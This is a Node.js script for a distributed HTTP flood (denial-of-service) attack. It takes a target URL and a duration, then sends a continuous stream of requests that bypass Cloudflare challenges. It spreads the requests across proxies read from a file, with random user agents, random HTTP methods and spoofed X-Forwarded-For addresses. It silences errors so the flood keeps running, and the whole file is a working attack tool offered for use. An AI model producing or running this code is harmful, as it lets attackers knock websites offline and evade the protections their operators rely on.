const cloudflare = require("cloudflare-bypasser");
const scraper = require('cloudscraper');
const path = require('path');
const fs = require('fs');
var random_useragent = require('random-useragent');
let cf = new cloudflare();

const target = process.argv[2],
	time = process.argv[3];
if (process.argv.length <= 2) {
	console.log("Usage: node test.js <target> <time>");
	process.exit(-1);
}
console.log("[+] Start attack!")
let proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
function randomNumber(min, max) {
	return Math.floor(Math.random() * (max - min) + min);
}

function send_req() {
	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
	var Array_method = ['HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'];
	var randommethod = Array_method[Math.floor(Math.random() * Array_method.length)];
	cf.request({
		method: randommethod,
		   cloudflareTimeout: 5000,
		   cloudflareMaxTimeout: 10000,
		   challengesToSolve: 10,
		   resolveWithFullResponse: true,
		   resolveWithFullResponse: true,
		headers: { 'User-Agent': random_useragent.getRandom(), 'Referer': target, 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=10, max=100', 'X-Forwarded-For': randomNumber(1, 255) + '.' + randomNumber(1, 255) + '.' + randomNumber(1, 255) + '.' + randomNumber(1, 255), },
    proxy: 'http://' + proxy,
		uri: target + '?'
		}).then(res => {});	}

setInterval(() => {
	send_req();
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
   
});
process.on('unhandledRejection', function (err) {
   
});

